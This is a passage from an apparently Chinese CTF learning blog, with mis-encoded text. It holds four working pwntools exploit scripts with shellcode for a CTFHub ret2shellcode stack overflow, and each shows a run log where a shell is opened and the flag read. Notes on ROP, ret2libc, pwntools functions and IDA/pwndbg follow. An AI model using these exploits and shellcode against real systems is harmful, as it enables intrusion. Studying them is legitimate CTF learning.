class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br>io = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com&quot;, 25197) </span><br><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode = asm(shellcraft.sh())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;shellcode:&#x27;</span>,shellcode)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;len(shellcode):&#x27;</span>,<span class="hljs-built_in">len</span>(shellcode))<br><br>buf_addr = io.recvuntil(<span class="hljs-string">&#x27;]&#x27;</span>)  <span class="hljs-comment">#æˆªå–åˆ°]ä¸ºæ­¢çš„å­—ç¬¦ä¸²</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;buf_addr:&#x27;</span>,buf_addr)<br>buf_addr = buf_addr[-<span class="hljs-number">15</span>:-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;buf_addr:&#x27;</span>,buf_addr)<br>buf_addr = <span class="hljs-built_in">int</span>(buf_addr[-<span class="hljs-number">15</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)  <span class="hljs-comment">#å¤„ç†ä¸€ä¸‹ ç„¶åä¸º16è¿›åˆ¶</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;buf_addr:&#x27;</span>,buf_addr)<br><br>shellcode_addr = buf_addr+<span class="hljs-number">32</span>   <span class="hljs-comment">#0x10+0x08+0x08 åè¿›åˆ¶ä¸º32</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">0x08</span>) + p64(shellcode_addr) + shellcode<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;payload:&#x27;</span>,payload)<br><br>io.sendline(payload)<br>io.interactive()<br><br><span class="hljs-comment"># python </span><br><span class="hljs-comment"># &gt;&gt;&gt; hex(140726337563760)</span><br><span class="hljs-comment"># &#x27;0x7ffd675c6c70&#x27;</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[root@ningan ret2shellcode]# python exp.py</span><br><span class="hljs-string">[+] Opening connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com on port 25197: Done</span><br><span class="hljs-string">shellcode: b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span><br><span class="hljs-string">len(shellcode): 48</span><br><span class="hljs-string">buf_addr: b&#x27;Welcome to CTFHub ret2shellcode!\nWhat is it : [0x7ffd675c6c70]&#x27;</span><br><span class="hljs-string">buf_addr: b&#x27;0x7ffd675c6c70&#x27;</span><br><span class="hljs-string">buf_addr: 140726337563760</span><br><span class="hljs-string">payload: b&#x27;aaaaaaaaaaaaaaaaaaaaaaaa\x90l\\g\xfd\x7f\x00\x00jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string"> ?</span><br><span class="hljs-string">Input someting :</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">bin</span><br><span class="hljs-string">dev</span><br><span class="hljs-string">flag</span><br><span class="hljs-string">lib</span><br><span class="hljs-string">lib32</span><br><span class="hljs-string">lib64</span><br><span class="hljs-string">pwn</span><br><span class="hljs-string">$ cat flag</span><br><span class="hljs-string">ctfhub&#123;0ac15488cb9e428301839991&#125;</span><br><span class="hljs-string">$</span><br><span class="hljs-string">[*] Closed connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com port 25197</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><h3 id="exp2-1"><a href="#exp2-1" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>host=<span class="hljs-string">&#x27;challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com&#x27;</span><br>port=<span class="hljs-number">25197</span><br>io=connect(host,port)<br><br><br>padding=<span class="hljs-number">0x18</span><br><span class="hljs-comment">#Get the addr of buf</span><br>io.recvuntil(<span class="hljs-string">&#x27;[&#x27;</span>)<br>buf_addr=io.recvuntil(<span class="hljs-string">&#x27;]&#x27;</span>,drop=<span class="hljs-literal">True</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Input someting :&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;buf_addr:&#x27;</span>,buf_addr)<br><br><br>payload=flat([<span class="hljs-string">&#x27;a&#x27;</span>*padding, p64(<span class="hljs-built_in">int</span>(buf_addr,<span class="hljs-number">16</span>)+<span class="hljs-number">32</span>), asm(shellcraft.sh())])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;payload:&#x27;</span>,payload)<br><br><br>io.sendline(payload)<br>io.interactive()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[root@ningan ret2shellcode]# python exp2.py</span><br><span class="hljs-string">[+] Opening connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com on port 25197: Done</span><br><span class="hljs-string">buf_addr: b&#x27;0x7ffd6f060390&#x27;</span><br><span class="hljs-string">payload: b&#x27;aaaaaaaaaaaaaaaaaaaaaaaa\xb0\x03\x06o\xfd\x7f\x00\x00jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string"></span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">bin</span><br><span class="hljs-string">dev</span><br><span class="hljs-string">flag</span><br><span class="hljs-string">lib</span><br><span class="hljs-string">lib32</span><br><span class="hljs-string">lib64</span><br><span class="hljs-string">pwn</span><br><span class="hljs-string">$</span><br><span class="hljs-string">$ cat flag</span><br><span class="hljs-string">ctfhub&#123;0ac15488cb9e428301839991&#125;</span><br><span class="hljs-string">$</span><br><span class="hljs-string">[*] Closed connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com port 25197</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="exp3-1"><a href="#exp3-1" class="headerlink" title="exp3"></a>exp3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&#x27;debug&#x27;)</span><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br><span class="hljs-comment"># io = process(&#x27;ret2shellcode&#x27;)</span><br>io = remote(<span class="hljs-string">&quot;challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com&quot;</span>, <span class="hljs-number">25197</span>) <br><br>io.recvuntil(<span class="hljs-string">b&#x27;[&#x27;</span>)<br>buf_address = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;]&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(buf_address).upper())<br><br>shellcode_address = buf_address+<span class="hljs-number">0x20</span> <span class="hljs-comment"># bufä¸rbpçš„è·ç¦»0x10 + rbpçš„å®½åº¦0x8 + è¿”å›åœ°å€çš„é•¿åº¦0x8</span><br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(shellcode_address).upper())<br><br>shellcode = asm(shellcraft.sh())<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + <span class="hljs-string">b&#x27;fuckpwn!&#x27;</span> + p64(shellcode_address) + shellcode<br><br>io.recv()<br>io.sendline(payload)<br>io.interactive()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[root@ningan ret2shellcode]# python exp3.py</span><br><span class="hljs-string">[+] Opening connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com on port 25197: Done</span><br><span class="hljs-string">[+] buf_address =&gt; 0X7FFC5FC266B0</span><br><span class="hljs-string">[+] buf_address =&gt; 0X7FFC5FC266D0</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">bin</span><br><span class="hljs-string">dev</span><br><span class="hljs-string">flag</span><br><span class="hljs-string">lib</span><br><span class="hljs-string">lib32</span><br><span class="hljs-string">lib64</span><br><span class="hljs-string">pwn</span><br><span class="hljs-string">$</span><br><span class="hljs-string">$ cat flaf</span><br><span class="hljs-string">cat: flaf: No such file or directory</span><br><span class="hljs-string">$</span><br><span class="hljs-string">$ cat g</span><br><span class="hljs-string">cat: g: No such file or directory</span><br><span class="hljs-string">$</span><br><span class="hljs-string">$ cat flag</span><br><span class="hljs-string">ctfhub&#123;0ac15488cb9e428301839991&#125;</span><br><span class="hljs-string">$</span><br><span class="hljs-string">[*] Interrupted</span><br><span class="hljs-string">[*] Closed connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com port 25197</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="exp4-1"><a href="#exp4-1" class="headerlink" title="exp4"></a>exp4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>host = <span class="hljs-string">&#x27;challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com&#x27;</span><br>port = <span class="hljs-number">25197</span><br>p = connect(host,port)<br><br>p.recvuntil(<span class="hljs-string">&#x27;[&#x27;</span>)<br>buf_addr = p.recvuntil(<span class="hljs-string">&#x27;]&#x27;</span>, drop=<span class="hljs-literal">True</span>) <span class="hljs-comment"># è·å–bufåœ°å€</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;buf_addr:&#x27;</span>,buf_addr)<br><br>p.recvuntil(<span class="hljs-string">&#x27;Input someting : &#x27;</span>) <span class="hljs-comment"># æ‰§è¡Œç›´åˆ°å‡ºç°è¿™å¥è¯</span><br>shell=<span class="hljs-string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span> + p64(<span class="hljs-built_in">int</span>(buf_addr,<span class="hljs-number">16</span>)+<span class="hljs-number">32</span>) + shell<br><br>p.sendline(payload)<br>p.interactive()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[root@ningan ret2shellcode]# python exp4.py</span><br><span class="hljs-string">[+] Opening connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com on port 25197: Done</span><br><span class="hljs-string">buf_addr: b&#x27;0x7fff875469b0&#x27;</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string"></span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">bin</span><br><span class="hljs-string">dev</span><br><span class="hljs-string">flag</span><br><span class="hljs-string">lib</span><br><span class="hljs-string">lib32</span><br><span class="hljs-string">lib64</span><br><span class="hljs-string">pwn</span><br><span class="hljs-string">$</span><br><span class="hljs-string">$ cat flag</span><br><span class="hljs-string">ctfhub&#123;0ac15488cb9e428301839991&#125;</span><br><span class="hljs-string">$</span><br><span class="hljs-string">[*] Interrupted</span><br><span class="hljs-string">[*] Closed connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com port 25197</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ROP]<span class="hljs-comment"># ./pwn</span><br>Welcome to CTFHub rop.Input someting:<br><br>1234567890<br>[root@ningan ROP]<span class="hljs-comment"># checksec pwn</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfhub/ROP/pwn&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>[root@ningan ROP]<span class="hljs-comment"># file pwn</span><br>pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=f5d131f24a3b86fc859f2cfade17eb92888ff738, not stripped<br></code></pre></td></tr></table></figure><h2 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssize_t <span class="hljs-built_in">vulnerable_function</span>()<br>&#123;<br>  char buf<span class="hljs-selector-attr">[64]</span>; <span class="hljs-comment">// [rsp+0h] [rbp-40h] BYREF</span><br><br>  return <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>x200uLL);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ï¼ï¼ï¼é‡ç‚¹ï¼ï¼ï¼-1"><a href="#ï¼ï¼ï¼é‡ç‚¹ï¼ï¼ï¼-1" class="headerlink" title="ï¼ï¼ï¼é‡ç‚¹ï¼ï¼ï¼"></a>ï¼ï¼ï¼é‡ç‚¹ï¼ï¼ï¼</h2><p>è¿™é“é¢˜æ˜¯ æ²¡æœ‰ sytemå‡½æ•° å’Œ bin&#x2F;sh æ¥ä¾›æˆ‘ä»¬åˆ©ç”¨çš„    rop_x64,æ³„éœ²libc</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfç³»åˆ—ã€‘pwn expå¸¸ç”¨å‡½æ•°è§£æ</title>
    <link href="/2023/08/18/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn%20exp%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90/"/>
    <url>/2023/08/18/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn%20exp%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br></code></pre></td></tr></table></figure><p>sendlineafter  å½“æ”¶åˆ°ç¬¬ä¸€ä¸ªå‚æ•°ä¹‹åï¼Œå°±å‘é€ç¬¬äºŒä¸ªå‚æ•°+&#x2F;nè¾“å‡º</p><h2 id="cyclic"><a href="#cyclic" class="headerlink" title="cyclic"></a>cyclic</h2><p>æ˜¯ç”¨æ¥å¡«å……åƒåœ¾æ•°æ®çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt;&gt; from pwn import *<br>&gt;&gt;&gt;<br>&gt;&gt;&gt; cyclic(60)<br>b<span class="hljs-string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa&#x27;</span><br>&gt;&gt;&gt;<br>&gt;&gt;&gt; cyclic(0x16 + 8)<br>b<span class="hljs-string">&#x27;aaaabaaacaaadaaaeaaafaaagaaaha&#x27;</span><br>&gt;&gt;&gt;<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *         <span class="hljs-comment"># ç”¨äºåˆ›å»ºä¸äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œäº¤äº’çš„è„šæœ¬ã€‚å®ƒæä¾›äº†è®¸å¤šç”¨äºæ¼æ´åˆ©ç”¨çš„åŠŸèƒ½ã€‚ </span><br>p=process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)  <span class="hljs-comment"># è¿™åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œæ‰§è¡Œåä¸º `ret2libc3` çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚è¿™é€šå¸¸ç”¨äºåœ¨æœ¬åœ°ç³»ç»Ÿä¸Šè°ƒè¯•å’Œæµ‹è¯•æ¼æ´åˆ©ç”¨è„šæœ¬ã€‚</span><br>elf=ELF(<span class="hljs-string">&#x27;ret2libc3&#x27;</span>)      <span class="hljs-comment"># è¿™å°†äºŒè¿›åˆ¶æ–‡ä»¶ `ret2libc3` åŠ è½½åˆ°ä¸€ä¸ªå¯¹è±¡ `elf` ä¸­ï¼Œä»¥ä¾¿å¯ä»¥ä»ä¸­è·å–æœ‰å…³äºŒè¿›åˆ¶æ–‡ä»¶çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å‡½æ•°åœ°å€ã€GOTï¼ˆGlobal Offset Tableï¼‰ç­‰ã€‚</span><br>put_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]   <span class="hljs-comment"># è·å–äº†åœ¨äºŒè¿›åˆ¶æ–‡ä»¶çš„ PLT è¡¨ä¸­ `puts` å‡½æ•°çš„åœ°å€ã€‚</span><br>put_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>start_addr=elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfå·¥å…·ç³»åˆ—ã€‘pwndbg</title>
    <link href="/2023/08/17/ctf/%E3%80%90ctf%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E3%80%91ida%E3%80%81pwndbg%E3%80%81one_gadget/"/>
    <url>/2023/08/17/ctf/%E3%80%90ctf%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E3%80%91ida%E3%80%81pwndbg%E3%80%81one_gadget/</url>
    
    <content type="html"><![CDATA[<h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p>ä¸‹é¢ä¸¤ä¸ªè§†å›¾çš„åˆ‡æ¢ï¼ŒæŒ‰ä¸‹ç©ºæ ¼é”®å°±å¯ä»¥</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817193929.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817193947.png" alt="image.png"></p><p>æœ‰LOADçš„è¡¨ç¤ºç¨‹åºè£…å…¥å†…å­˜çš„æ§åˆ¶ä¿¡æ¯</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817194116.png" alt="image.png"></p><p>pltåœ¨ä»£ç æ®µ<br>æ¯ä¸ªè¡¨é¡¹éƒ½æ˜¯16å­—èŠ‚  ä¾‹å¦‚ä¸‹é¢çš„ï¼š xxx26-&gt;xxx36</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817194259.png" alt="image.png"></p><p>gotåœ¨æ•°æ®æ®µ<br>got.pltåœ¨æ•°æ®æ®µ   </p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817194717.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817232404.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817233207.png" alt="image.png"></p><p>shift+F12    æ‰¾åˆ°å­—ç¬¦ä¸²   åŒå‡»</p><p>ç‚¹å‡½æ•°ï¼Œè¾“å…¥nï¼Œè¿›è¡Œé‡å‘½å</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822215158.png" alt="image.png"></p><h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p>gdbå¸¸ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb <span class="hljs-built_in">link</span><br>n<br>info b<br>d 1           <span class="hljs-comment"># åˆ é™¤æ–­ç‚¹</span><br>b *0xxxxx<br>b å‡½æ•°å<br>c             <span class="hljs-comment"># continue</span><br>plt<br>got<br>backtrace<br><span class="hljs-built_in">return</span>    <span class="hljs-comment"># æŠŠè¿™ä¸ªåº“å‡½æ•°é€€å‡º</span><br><br>fastbin<br><br>pwndbg&gt; distance æºåœ°å€ ç›®çš„åœ°å€<br>pwndbg&gt; p/d 0x6c<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817195008.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817195211.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">disass åœ°å€<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817195329.png" alt="image.png"></p><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>ä¸€ä¸ªgadgetå°±èƒ½å®Œæˆæ”»å‡»çš„ç›®çš„<br>å¯¹ç¨‹åºçš„ç¯å¢ƒå’Œä¾èµ–è¦æ±‚æ¯”è¾ƒé«˜</p><h2 id="â€”â€”â€”â€”â€”â€”â€”"><a href="#â€”â€”â€”â€”â€”â€”â€”" class="headerlink" title="â€”â€”â€”â€”â€”â€”â€”-"></a>â€”â€”â€”â€”â€”â€”â€”-</h2><h2 id="æŸ¥çœ‹ä¸¤ä¸ªåœ°å€çš„è·ç¦»"><a href="#æŸ¥çœ‹ä¸¤ä¸ªåœ°å€çš„è·ç¦»" class="headerlink" title="æŸ¥çœ‹ä¸¤ä¸ªåœ°å€çš„è·ç¦»"></a>æŸ¥çœ‹ä¸¤ä¸ªåœ°å€çš„è·ç¦»</h2><h3 id="gdbæ–¹æ³•"><a href="#gdbæ–¹æ³•" class="headerlink" title="gdbæ–¹æ³•"></a>gdbæ–¹æ³•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; distance 0x7fffffffe140 0x7fffffffe1b0<br>0x7fffffffe140-&gt;0x7fffffffe1b0 is 0x70 bytes (0xe words)<br></code></pre></td></tr></table></figure><h3 id="pythonæ–¹æ³•"><a href="#pythonæ–¹æ³•" class="headerlink" title="pythonæ–¹æ³•"></a>pythonæ–¹æ³•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2text]<span class="hljs-comment"># python</span><br>Python 3.6.9 (default, Mar 10 2023, 16:46:00)<br>[GCC 8.4.0] on linux<br>Type <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> or <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br>&gt;&gt;&gt; 0x7fffffffe1b0 - 